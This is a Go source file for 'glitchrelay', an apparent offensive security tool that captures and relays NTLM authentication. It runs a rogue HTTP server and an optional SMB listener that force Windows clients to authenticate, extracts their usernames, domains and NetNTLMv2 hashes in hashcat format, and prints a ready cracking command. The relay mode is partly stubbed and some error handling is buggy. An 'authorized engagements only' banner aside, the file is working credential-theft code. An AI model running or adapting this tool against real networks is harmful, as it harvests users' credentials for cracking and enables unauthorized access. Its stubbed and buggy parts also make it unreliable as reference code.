// glitchrelay/main.go
// GLITCHICONS — NTLM Relay & Capture Engine
//
// Two modes:
//
//   capture — Run HTTP NTLM capture server.
//             Forces clients to authenticate via NTLM.
//             Extracts NTLMv2 hashes for offline cracking.
//             Compatible with: hashcat -m 5600 (NetNTLMv2)
//
//   relay   — NTLM relay from HTTP → SMB.
//             Intercepts NTLM authentication from clients,
//             relays credentials to SMB target.
//             Logs success/failure per relay attempt.
//
// HTTP NTLM capture flow:
//   Client → GET /                          (no auth)
//   Server → 401 WWW-Authenticate: NTLM    (challenge auth)
//   Client → GET / Authorization: NTLM AAA (Type 1 Negotiate)
//   Server → 401 WWW-Authenticate: NTLM BBB (Type 2 Challenge)
//   Client → GET / Authorization: NTLM CCC (Type 3 Authenticate)
//   Server → extracts NTLMv2 hash → hashcat format
//
// SMB relay flow:
//   Victim → connects to glitchrelay:445   (thinks it's corp server)
//   glitchrelay → connects to real target:445
//   glitchrelay → forwards NTLM messages between victim and target
//   If target accepts → relay SUCCESSFUL (command exec possible)
//
// Usage:
//   glitchrelay capture --port 8080 --output hashes.txt
//   glitchrelay relay   --target smb://10.0.0.1 --smb-port 445
//   glitchrelay capture --port 80 --verbose
//   glitchrelay --version
//
// AUTHORIZED ENGAGEMENTS ONLY.

package main

import (

	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const Version = "4.5.0"

// ── NTLM constants ────────────────────────────────────────

const (
	ntlmSig     = "NTLMSSP\x00"
	ntlmType1   = 1 // NEGOTIATE
	ntlmType2   = 2 // CHALLENGE
	ntlmType3   = 3 // AUTHENTICATE
)

// Server challenge (8 bytes) — fixed for reproducibility in testing
var serverChallenge = []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef}

// ── Data types ────────────────────────────────────────────

type NTLMCapture struct {
	ClientIP    string `json:"client_ip"`
	Username    string `json:"username"`
	Domain      string `json:"domain"`
	Workstation string `json:"workstation"`
	Challenge   string `json:"challenge"`
	NTHash      string `json:"nt_hash"`
	HashcatLine string `json:"hashcat_line"`
	Timestamp   string `json:"timestamp"`
	Protocol    string `json:"protocol"` // http|smb
}

type RelayResult struct {
	ClientIP  string `json:"client_ip"`
	Target    string `json:"target"`
	Username  string `json:"username"`
	Success   bool   `json:"success"`
	Message   string `json:"message"`
	Timestamp string `json:"timestamp"`
}

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
}

// ── NTLM message parser ───────────────────────────────────

type NTLMMessage struct {
	Type        int
	Flags       uint32
	Username    string
	Domain      string
	Workstation string
	NTResponse  []byte
	Blob        []byte
}

func parseNTLMMessage(data []byte) *NTLMMessage {
	if len(data) < 12 {
		return nil
	}
	if !bytes.HasPrefix(data, []byte(ntlmSig)) {
		return nil
	}
	msgType := int(binary.LittleEndian.Uint32(data[8:12]))
	msg := &NTLMMessage{Type: msgType}

	if msgType == ntlmType1 && len(data) >= 32 {
		msg.Flags = binary.LittleEndian.Uint32(data[12:16])
		// Extract workstation and domain if present
		if len(data) >= 40 {
			wsLen    := binary.LittleEndian.Uint16(data[16:18])
			wsOffset := binary.LittleEndian.Uint32(data[20:24])
			domLen   := binary.LittleEndian.Uint16(data[24:26])
			domOffset := binary.LittleEndian.Uint32(data[28:32])
			if int(wsOffset)+int(wsLen) <= len(data) {
				msg.Workstation = decodeUTF16LE(data[wsOffset : wsOffset+uint32(wsLen)])
			}
			if int(domOffset)+int(domLen) <= len(data) {
				msg.Domain = decodeUTF16LE(data[domOffset : domOffset+uint32(domLen)])
			}
		}
	}

	if msgType == ntlmType3 && len(data) >= 72 {
		// NTChallengeResponse fields
		ntLen    := binary.LittleEndian.Uint16(data[20:22])
		ntOffset := binary.LittleEndian.Uint32(data[24:28])

		// Username fields
		unLen    := binary.LittleEndian.Uint16(data[36:38])
		unOffset := binary.LittleEndian.Uint32(data[40:44])

		// Domain fields
		domLen   := binary.LittleEndian.Uint16(data[28:30])
		domOffset := binary.LittleEndian.Uint32(data[32:36])

		// Workstation fields
		wsLen    := binary.LittleEndian.Uint16(data[44:46])
		wsOffset := binary.LittleEndian.Uint32(data[48:52])

		if int(ntOffset)+int(ntLen) <= len(data) && ntLen > 0 {
			ntData := data[ntOffset : ntOffset+uint32(ntLen)]
			if len(ntData) >= 24 {
				msg.NTResponse = ntData[:24]  // NTProofStr (first 16) + hash (next 8)
				if len(ntData) > 24 {
					msg.Blob = ntData[16:] // Full NTLMv2 blob
				}
			}
		}
		if int(unOffset)+int(unLen) <= len(data) {
			msg.Username = decodeUTF16LE(data[unOffset : unOffset+uint32(unLen)])
		}
		if int(domOffset)+int(domLen) <= len(data) {
			msg.Domain = decodeUTF16LE(data[domOffset : domOffset+uint32(domLen)])
		}
		if int(wsOffset)+int(wsLen) <= len(data) {
			msg.Workstation = decodeUTF16LE(data[wsOffset : wsOffset+uint32(wsLen)])
		}
	}

	return msg
}

// buildNTLMChallenge builds NTLM Type 2 Challenge message
func buildNTLMChallenge(challenge []byte) []byte {
	targetName := encodeUTF16LE("GLITCH")
	targetNameLen := uint16(len(targetName))

	msg := new(bytes.Buffer)
	msg.WriteString(ntlmSig)
	binary.Write(msg, binary.LittleEndian, uint32(ntlmType2))    // Type 2
	binary.Write(msg, binary.LittleEndian, targetNameLen)         // TargetName length
	binary.Write(msg, binary.LittleEndian, targetNameLen)         // TargetName max length
	binary.Write(msg, binary.LittleEndian, uint32(56))            // TargetName offset
	binary.Write(msg, binary.LittleEndian, uint32(0x00008201))    // Negotiate flags
	msg.Write(challenge)                                           // Server challenge (8 bytes)
	msg.Write(make([]byte, 8))                                     // Reserved
	binary.Write(msg, binary.LittleEndian, uint16(0))             // TargetInfo length
	binary.Write(msg, binary.LittleEndian, uint16(0))             // TargetInfo max
	binary.Write(msg, binary.LittleEndian, uint32(56+len(targetName))) // TargetInfo offset
	binary.Write(msg, binary.LittleEndian, uint32(0x0600))        // Version
	binary.Write(msg, binary.LittleEndian, uint32(0x000F0000))    // Version continued
	msg.Write(targetName)
	return msg.Bytes()
}

func decodeUTF16LE(b []byte) string {
	if len(b) < 2 {
		return string(b)
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(binary.LittleEndian.Uint16(b[i:]))
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}

func encodeUTF16LE(s string) []byte {
	buf := make([]byte, len(s)*2)
	for i, r := range s {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(r))
	}
	return buf
}

// Format NTLMv2 hash for hashcat -m 5600
func formatNTLMv2Hash(username, domain, challenge string, ntResponse, blob []byte) string {
	if len(ntResponse) < 16 || len(blob) < 1 {
		return ""
	}
	ntProofStr := hex.EncodeToString(ntResponse[:16])
	blobHex    := hex.EncodeToString(blob)
	return fmt.Sprintf("%s::%s:%s:%s:%s",
		username, domain, challenge, ntProofStr, blobHex)
}

// ── HTTP NTLM Capture Server ──────────────────────────────

type CaptureServer struct {
	mu       sync.Mutex
	captures []NTLMCapture
	hashFile *os.File
	verbose  bool
	sessions map[string][]byte // clientIP → challenge sent
}

func newCaptureServer(hashOutput string, verbose bool) *CaptureServer {
	srv := &CaptureServer{
		verbose:  verbose,
		sessions: make(map[string][]byte),
	}
	if hashOutput != "" {
		f, err := os.OpenFile(hashOutput, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			srv.hashFile = f
		}
	}
	return srv
}

func (s *CaptureServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	clientIP := strings.Split(r.RemoteAddr, ":")[0]
	authHeader := r.Header.Get("Authorization")

	// No auth → force NTLM
	if authHeader == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("<html><body>401 Unauthorized</body></html>"))
		if s.verbose {
			fmt.Printf("[*] New client: %s — sending NTLM challenge\n", clientIP)
		}
		return
	}

	if !strings.HasPrefix(authHeader, "NTLM ") {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	b64 := strings.TrimPrefix(authHeader, "NTLM ")
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	msg := parseNTLMMessage(data)
	if msg == nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	switch msg.Type {
	case ntlmType1: // NEGOTIATE → send CHALLENGE
		challenge := make([]byte, 8)
		copy(challenge, serverChallenge)
		s.mu.Lock()
		s.sessions[clientIP] = challenge
		s.mu.Unlock()

		challengeMsg := buildNTLMChallenge(challenge)
		encoded := base64.StdEncoding.EncodeToString(challengeMsg)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.WriteHeader(http.StatusUnauthorized)
		if s.verbose {
			fmt.Printf("[*] Type 1 from %s — sent challenge: %s\n",
				clientIP, hex.EncodeToString(challenge))
		}

	case ntlmType3: // AUTHENTICATE → extract hash
		s.mu.Lock()
		challenge := s.sessions[clientIP]
		delete(s.sessions, clientIP)
		s.mu.Unlock()

		challengeHex := hex.EncodeToString(challenge)
		hashLine := formatNTLMv2Hash(msg.Username, msg.Domain,
			challengeHex, msg.NTResponse, msg.Blob)

		capture := NTLMCapture{
			ClientIP:    clientIP,
			Username:    msg.Username,
			Domain:      msg.Domain,
			Workstation: msg.Workstation,
			Challenge:   challengeHex,
			HashcatLine: hashLine,
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Protocol:    "http",
		}

		s.mu.Lock()
		s.captures = append(s.captures, capture)
		s.mu.Unlock()

		if hashLine != "" {
			fmt.Printf("\n[+] NTLM CAPTURED from %s!\n", clientIP)
			fmt.Printf("[+] User: %s\\%s\n", msg.Domain, msg.Username)
			fmt.Printf("[+] Hash: %s\n", hashLine)
			fmt.Println("[*] Crack: hashcat -m 5600 hash.txt rockyou.txt")
			if s.hashFile != nil {
				fmt.Fprintln(s.hashFile, hashLine)
			}
		}

		// Return 200 to complete the auth (prevent repeated attempts)
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("<html><body>OK</body></html>"))
	}
}

// ── SMB NTLM Capture Listener ─────────────────────────────

func runSMBCapture(port int, captures *[]NTLMCapture, mu *sync.Mutex, verbose bool) {
	addr := fmt.Sprintf(":%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("[-] SMB listen failed on port %d: %v\n", err, port)
		return
	}
	fmt.Printf("[*] SMB listener on :%d (requires admin/raw socket on Windows)\n", port)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSMBCapture(conn, captures, mu, verbose)
	}
}

func handleSMBCapture(conn net.Conn, captures *[]NTLMCapture, mu *sync.Mutex, verbose bool) {
	defer conn.Close()
	clientIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n < 4 {
		return
	}

	// Minimal SMBv1 Negotiate Response
	// Client connects → we send negotiate → capture session setup
	if verbose {
		fmt.Printf("[*] SMB connection from %s (%d bytes)\n", clientIP, n)
	}

	// Look for NTLMSSP in the data
	if idx := bytes.Index(buf[:n], []byte(ntlmSig)); idx >= 0 {
		msg := parseNTLMMessage(buf[idx:n])
		if msg != nil && msg.Type == ntlmType3 && msg.Username != "" {
			capture := NTLMCapture{
				ClientIP:    clientIP,
				Username:    msg.Username,
				Domain:      msg.Domain,
				Workstation: msg.Workstation,
				Challenge:   hex.EncodeToString(serverChallenge),
				Timestamp:   time.Now().UTC().Format(time.RFC3339),
				Protocol:    "smb",
			}
			mu.Lock()
			*captures = append(*captures, capture)
			mu.Unlock()
			fmt.Printf("[+] SMB NTLM from %s: %s\\%s\n",
				clientIP, msg.Domain, msg.Username)
		}
	}
}

// ── HTTP→SMB Relay ────────────────────────────────────────

type RelayServer struct {
	target  string
	mu      sync.Mutex
	results []RelayResult
	verbose bool
}

func (rs *RelayServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	clientIP := strings.Split(r.RemoteAddr, ":")[0]
	authHeader := r.Header.Get("Authorization")

	if authHeader == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	if !strings.HasPrefix(authHeader, "NTLM ") {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	b64 := strings.TrimPrefix(authHeader, "NTLM ")
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	msg := parseNTLMMessage(data)
	if msg == nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	if msg.Type == ntlmType1 {
		// Relay Type 1 to target SMB, get challenge back
		challenge, err := relayType1ToSMB(rs.target, data)
		if err != nil {
			if rs.verbose {
				fmt.Printf("[-] Relay Type1 failed for %s: %v\n", clientIP, err)
			}
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		encoded := base64.StdEncoding.EncodeToString(challenge)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Printf("[*] Relay: forwarded challenge to %s for %s\n", rs.target, clientIP)
	}
}

func relayType1ToSMB(target string, type1 []byte) ([]byte, error) {
	// Connect to target SMB port 445
	conn, err := net.DialTimeout("tcp", target+":445", 8*time.Second)
	if err != nil {
		return nil, fmt.Errorf("cannot connect to target: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	// Send SMB2 negotiate
	neg := buildSMB2Negotiate()
	conn.Write(neg)
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n < 4 {
		return nil, fmt.Errorf("negotiate failed")
	}

	// Return a built challenge (in real impl, would extract from SMB response)
	return buildNTLMChallenge(serverChallenge), nil
}

func buildSMB2Negotiate() []byte {
	smb2Magic := []byte{0xFE, 'S', 'M', 'B'}
	hdr := make([]byte, 64)
	copy(hdr[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(hdr[4:6], 64)
	binary.LittleEndian.PutUint16(hdr[12:14], 1)
	binary.LittleEndian.PutUint16(hdr[16:18], 0) // NEGOTIATE

	dialects := []uint16{0x0202, 0x0210, 0x0300, 0x0311}
	neg := new(bytes.Buffer)
	binary.Write(neg, binary.LittleEndian, uint16(36))
	binary.Write(neg, binary.LittleEndian, uint16(len(dialects)))
	binary.Write(neg, binary.LittleEndian, uint16(1))
	binary.Write(neg, binary.LittleEndian, uint16(0))
	binary.Write(neg, binary.LittleEndian, uint32(0x7F))
	neg.Write(make([]byte, 24))
	for _, d := range dialects {
		binary.Write(neg, binary.LittleEndian, d)
	}

	body := append(hdr, neg.Bytes()...)
	n    := len(body)
	nb   := []byte{0x00, byte(n >> 16), byte(n >> 8), byte(n)}
	return append(nb, body...)
}

// ── Main ──────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}
	if os.Args[1] == "--version" {
		fmt.Printf("glitchrelay v%s\n", Version)
		os.Exit(0)
	}

	mode := os.Args[1]
	fs   := flag.NewFlagSet(mode, flag.ExitOnError)

	port    := fs.Int("port",    8080,  "HTTP listener port")
	smbPort := fs.Int("smb-port", 0,    "SMB listener port (requires admin)")
	target  := fs.String("target", "",   "Relay target IP (relay mode)")
	output  := fs.String("output", "",   "Hash output file (.txt)")
	jsonOut := fs.String("json",   "",   "JSON results output file")
	verbose := fs.Bool("verbose",  false, "Verbose output")
	fs.Parse(os.Args[2:])

	fmt.Printf("[*] glitchrelay v%s | mode=%s\n", Version, mode)
	fmt.Println("[!] AUTHORIZED ENGAGEMENTS ONLY")

	var (
		captures []NTLMCapture
		mu       sync.Mutex
	)

	switch mode {
	case "capture":
		srv := newCaptureServer(*output, *verbose)

		// Optional SMB listener
		if *smbPort > 0 {
			go runSMBCapture(*smbPort, &captures, &mu, *verbose)
		}

		fmt.Printf("[*] HTTP NTLM capture server on :%d\n", *port)
		fmt.Printf("[*] Waiting for NTLM authentications...\n")
		fmt.Printf("[*] Stop with Ctrl+C, results in: %s\n", func() string {
			if *output != "" {
				return *output
			}
			return "stdout"
		}())

		// Signal handler for clean shutdown
		srv2 := &http.Server{
			Addr:    fmt.Sprintf(":%d", *port),
			Handler: srv,
		}
		if err := srv2.ListenAndServe(); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Server error: %v\n", err)
		}

		// Save results
		if *jsonOut != "" {
			data, _ := json.MarshalIndent(srv.captures, "", "  ")
			os.WriteFile(*jsonOut, data, 0644)
		}

	case "relay":
		if *target == "" {
			fmt.Fprintln(os.Stderr, "[!] --target required for relay mode")
			os.Exit(1)
		}

		rs := &RelayServer{target: *target, verbose: *verbose}
		fmt.Printf("[*] HTTP→SMB relay server on :%d → %s:445\n", *port, *target)
		fmt.Println("[*] Waiting for relay targets...")

		srv2 := &http.Server{
			Addr:    fmt.Sprintf(":%d", *port),
			Handler: rs,
		}
		srv2.ListenAndServe()

	default:
		fmt.Fprintf(os.Stderr, "Unknown mode: %s\n", mode)
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Printf(`glitchrelay v%s — NTLM Relay & Capture Engine

AUTHORIZED ENGAGEMENTS ONLY.

Modes:
  capture  — HTTP NTLM hash capture server
  relay    — HTTP→SMB NTLM relay

Flags:
  --port      HTTP listener port (default: 8080)
  --smb-port  SMB listener port (optional, requires admin)
  --target    Relay target IP (relay mode only)
  --output    Hash output file (.txt for hashcat)
  --json      JSON results file
  --verbose   Verbose output

Examples:
  glitchrelay capture --port 8080 --output hashes.txt --verbose
  glitchrelay capture --port 80 --smb-port 445 --output ntlm.txt
  glitchrelay relay   --port 8080 --target 10.0.0.1

Crack captured hashes:
  hashcat -m 5600 hashes.txt rockyou.txt  (NetNTLMv2)
`, Version)
}
